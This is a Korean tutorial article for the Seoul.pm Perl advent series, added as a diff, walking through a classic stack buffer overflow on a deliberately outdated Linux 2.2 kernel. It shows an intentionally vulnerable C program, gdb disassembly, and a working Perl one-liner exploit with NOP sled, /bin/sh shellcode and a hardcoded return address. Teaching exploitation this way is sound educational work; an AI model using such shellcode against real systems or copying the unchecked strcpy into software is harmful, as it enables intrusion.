@@ -1,0 +1,185 @@
+Title:    익스플로잇과 펄
+Package:  Seoul.pm
+Category: perl
+Category: Seoul.pm
+Author:   h00ray
+
+저자
+-----
+
+@h00ray - 시험기간에 공부 안하고 프로그래밍 하는 잉여잉여한 학생, javaapi86 _at_ gmail.com
+
+
+시작하며
+---------
+
+2014년에 들어오면서 리눅스 환경에서의 굵직한 취약점이 발표되었습니다.
+[Bash 쉘 쇼크][wiki-shellshock]라던가 [OpenSSL Heartbleed][wiki-heartbleed] 말이죠.
+이번 기사에서 다룰 내용은 나열한 취약점과는 거리가 있지만,
+리눅스 환경에서의 해킹을 조금이라도 맛 볼겸(?)
+메모리 버그의 일종인 [버퍼 오버플로우(BOF, Buffer Overflow)][wiki-bof]를
+이용한 해킹 기법을 살펴보겠습니다.
+
+
+배경 지식
+----------
+
+우선 공격할 리눅스 정보를 살펴볼까요?
+
+    #!bash
+    $uname -a
+    Linux localhost.localdomain 2.2.14-5.0 #1 Tue Mar 7 21:07:39 EST 2000 i686 unknown
+
+후아! 고대의 유물과 같은 버전이군요.
+커널의 버전이 매우 낮다는 것을 알 수 있는데 사실 일부로 낮은 버전을 선택했습니다.
+현재 최신의 리눅스 커널은 해커들의 공격을 막기위해 많은 보호 기법을 도입하고 있습니다.
+
+이러한 보호 기법으로는
+공격프로그램(exploit)이 스택이나 힙에서 실행되지 않도록 하는 [NX-bit][wiki-nx-bit],
+메모리상의 공격을 방어하기위해 스택 주소를 무작위로 바꾸는 [ASLR][wiki-aslr],
+상위주소를 `\x00` 값으로시작하게하는 즉 NULL처리를 시켜서 공격이 불가능하도록 하는 [ASCII armor][wiki-binary-to-text-encoding]
+버퍼와 반환 주소 사이의 임의의 값이 변하면 프로그램을 종료시켜버리는 [canary][wiki-canary] 등이 있습니다.
+[canary][wiki-canary]의 경우 해킹에 성공하려면 `eip`를 제어해야하는데,
+이를 위해 반환 주소를 덮어써야 합니다.
+하지만 canary 보호 기법이 반환 주소를 모니터링하면서, 값이 변하면 프로그램을 종료시켜 버리므로
+한번에 공격할수있는 확률이 줄어들어 공격 난이도가 올라갑니다.
+
+이처럼 다양한 보호기법이 적용되면서 예전의 방법으로 공격하기는 힘들지만,
+[ROP(Return-oriented Programming)][wiki-rop]와 같은 공격 기법등 여전히 우회하는 방법은 있습니다.
+이런 무지막지한 보호 기법을 우회하려는 방법인 만큼 매우 복잡하겠죠?
+더 자세한 내용이 궁금하다면 [ROP(Return Oriented Programming) Exploit][home-teamcrak-rop] 문서를 참고하세요.
+
+
+공격!!
+-------
+
+지금부터 메모리 보호기법을 적용하지않은 (고대의?) 리눅스 커널을 대상으로 간단한 해킹을 해보죠.
+
+다음은 공격할 프로그램의 전체 코드입니다.
+
+    #!cpp
+    //vuln.c
+    //gcc -o vuln vuln.c
+    #include <stdio.h>
+    
+    int main(int argc, char *argv[])
+    {
+        char buffer[256];
+    
+        strcpy(buffer, argv[1]);
+        printf("%s\n", buffer);
+    
+        return 0;
+    }
+
+해킹에 성공하기 위해서는 "프로그램 구조를 개발자보다 잘 알아야 한다"라는
+말이 있을정도로 프로그램의 구조를 완벽하게 이해하고 있어야합니다.
+이제 분석을 하기위해 `gdb`를 실행합니다.
+
+    #!bash
+    $gdb vuln
+    
+    (gdb) disass main
+    Dump of assembler code for function main:
+    0x80483f8 <main>:	push   %ebp
+    0x80483f9 <main+1>:	mov    %esp,%ebp
+    0x80483fb <main+3>:	sub    $0x100,%esp
+    0x8048401 <main+9>:	mov    0xc(%ebp),%eax
+    0x8048404 <main+12>:	add    $0x4,%eax
+    0x8048407 <main+15>:	mov    (%eax),%edx
+    0x8048409 <main+17>:	push   %edx
+    0x804840a <main+18>:	lea    0xffffff00(%ebp),%eax
+    0x8048410 <main+24>:	push   %eax
+    0x8048411 <main+25>:	call   0x8048340 <strcpy>
+    0x8048416 <main+30>:	add    $0x8,%esp
+    0x8048419 <main+33>:	lea    0xffffff00(%ebp),%eax
+    0x804841f <main+39>:	push   %eax
+    0x8048420 <main+40>:	push   $0x8048480
+    0x8048425 <main+45>:	call   0x8048330 <printf>
+    0x804842a <main+50>:	add    $0x8,%esp
+    0x804842d <main+53>:	leave  
+    0x804842e <main+54>:	ret    
+    0x804842f <main+55>:	nop    
+    End of assembler dump.
+
+대충 봐도 현기증을 유발하는 디어셈블된 코드입니다.
+유심히 살펴봐야 할 부분은 `strcpy`함수를 호출하는 부분입니다.
+
+    #!plain
+    0x8048411 <main+25>:	call   0x8048340 <strcpy>
+
+간단하게 `strcpy` 함수에 대해 좀 더 알아보죠.
+
+    #!cpp
+    strcpy(buffer, argv[1]);
+
+앞의 코드는 `argv[1]`의 값을 버퍼에 복사합니다.
+요약하면 `eax`에는 `buffer`의 값 256 바이트,
+`edx`에는 `argv[1]`의 값이 들어가 있습니다.
+
+어셈블리 코드를 보면 `edx` 값을 넣고, 그 후 `eax(buffer)`를 스택에 넣으므로,
+결국 `strcpy(%eax,%edx);`처럼 들어있는 셈입니다.
+과연 생각한 것이 맞는지 `gdb`를 사용해서 확인해보겠습니다.
+
+    #!bash
+    (gdb) b *main+25
+    (gdb) r 1
+    Starting program: /home/vuln 1
+    
+    Breakpoint 1, 0x8048411 in main ()
+    (gdb) x/s $edx
+    0xbffffca0:	 "1"
+
+우선 `main+25` 지점에 브레이크 포인트를 겁니다.
+그 후 인자로 `1`을 주고 실행하면 `edx`에는 예상한대로 `1`이라는 값이 들어가 있습니다.
+
+이제 `0xffffff00`이 뭘 뜻하는지 알아야합니다.
+16진수를 10진수로 바꾸면 `256`이라는 값이 나옵니다.
+256 바이트를 `buffer`가 사용하고 있으니, `ret` 주소는 `256 + 4`입니다.
+
+자! 이제 펄 스크립트를 사용해 공격해보죠!
+
+    #!perl
+    $./vuln `perl -e 'print"A"x260'`
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    Segmentation fault (core dumped)
+
+`ret`값을 덮어쓰면서 공격하니 세그멘테이션 폴트 오류와 함께 강제 종료됩니다.
+이제 익스플로잇 코드를 작성하면 끝입니다.
+
+    #!perl
+    $./vuln `perl -e 'print "\x90"x125 , "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80","\x90"x110,"\x38\xf9\xff\xbf"'`
+    1?h//shh/bin??°
+                    ?8
+    bash$
+
+와우! 공격에 성공했습니다 ;)
+
+`\x90`은 `nop`이며 그냥 아무 것도 하지않고 다음 명령어로 넘어갑니다.
+`\x31\xc0\x50...\x0b\xcd\x80` 부분은 쉘 코드입니다.
+간단하게 쉘을 출력해주는 기계어 집합입니다.
+`\x38\xf9\xff\xbf` 부분은 스택의 값으로 `gdb`를 통해서 살펴 본 스택 주소입니다.
+
+
+정리하며
+---------
+
+펄은 시스템 관리와 프로그램 작성에 널리 사용되는 언어일 뿐만 아니라
+앞에서 보았듯이 목적(지금은 익스플로잇 작성? :)에 쉽게 도달할 수 있게
+도와주는 강력한 도구입니다.
+이런 펄의 유연함과 강력함이 많은 해커들을 매료시키지 않았을까요?
+조금은 에둘러 왔지만, 단지 시스템 관리자와 프로그래머만이
+펄을 사용하는 것이 아니란 사실 잊지마세요. ;-)
+
+아! 그리고 읽어주셔서 감사합니다!! :D
+
+
+[home-teamcrak-rop]:                http://teamcrak.tistory.com/332
+[wiki-aslr]:                        http://en.wikipedia.org/wiki/Address_space_layout_randomization
+[wiki-binary-to-text-encoding]:     http://en.wikipedia.org/wiki/Binary-to-text_encoding
+[wiki-bof]:                         http://en.wikipedia.org/wiki/Buffer_overflow
+[wiki-canary]:                      http://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries
+[wiki-heartbleed]:                  http://en.wikipedia.org/wiki/Heartbleed
+[wiki-nx-bit]:                      http://en.wikipedia.org/wiki/NX_bit
+[wiki-rop]:                         http://en.wikipedia.org/wiki/Return-oriented_programming
+[wiki-shellshock]:                  http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29
